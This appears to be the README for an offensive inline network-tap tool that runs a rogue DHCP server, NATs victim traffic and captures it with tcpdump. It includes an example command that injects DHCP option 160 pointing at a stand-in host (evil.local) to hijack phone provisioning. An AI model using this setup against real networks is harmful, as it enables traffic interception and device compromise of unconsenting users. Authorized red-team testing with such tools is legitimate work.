![Gozer](gozer.png)
  
# Gozer  
  
Gozer is an inline transparent tap that drops between a target and their uplink, stands up DHCP on the victim side, NATs everything through, and optionally captures traffic. Replaces a bunch of half-baked scripts I had lying around for doing this manually.  
  
Requires two NICs. Figures out which one has the default route (uplink) and uses the other for the victim net. If it can't tell, it will ask.  
  
## Usage  
  
```  
sudo python3 gozer.py  
```  
  
The basic use case will auto-detect available interfaces, pick a subnet, start DHCP, enable forwarding, set up NAT, and kick off tcpdump. Ctrl-C tears everything down and restores your iptables/sysctl state. 
  
## Options  
  
```  
--uplink IF        override uplink interface detection  
--victim IF        override victim interface detection  
--subnet CIDR      dhcp subnet (default: 10.66.66.0/24)  
--dns IP           dns server to hand out (default: whatever's in resolv.conf)  
--pool-start IP    first IP in dhcp pool (default: .100)  
--pool-end IP      last IP in dhcp pool (default: .200)  
--no-capture       don't start tcpdump  
--capture-filter   bpf filter string for tcpdump  
--dhcp-option N:V  inject a custom dhcp option (repeatable)  
-v                 verbose logging  
```  
  
## DHCP Option Injection  
  
The `--dhcp-option` flag lets you stuff arbitrary options into DHCP responses. Format is `CODE:VALUE`.  
  
Similar techniques were used during a Polycom provisioning hijack (option 160) in past operations:  
  
```  
sudo python3 gozer.py --dhcp-option 160:http://evil.local/cfg  
```  
  
In this scenario, a victim phone grabs a DHCP lease, gets told to pull its config from your server instead of the real provisioning host. Works for any protocol that bootstraps via DHCP options.
  
## How It Works 
  
1. Detects uplink (has default route) vs victim (no route) NIC  
2. Assigns an IP to the victim interface  
3. Starts a bare-bones DHCP server on the victim side  
4. Enables ip_forward and sets up iptables MASQUERADE  
5. Optionally starts tcpdump on the victim interface  
6. On exit, reverts everything (iptables rules, ip_forward, interface config)  
  
The DHCP server (`dhcpd.py`) handles DISCOVER/OFFER/REQUEST/ACK verbs. Lease tracking is minimal since victims are usually transient in scenarios that the tool is used in.
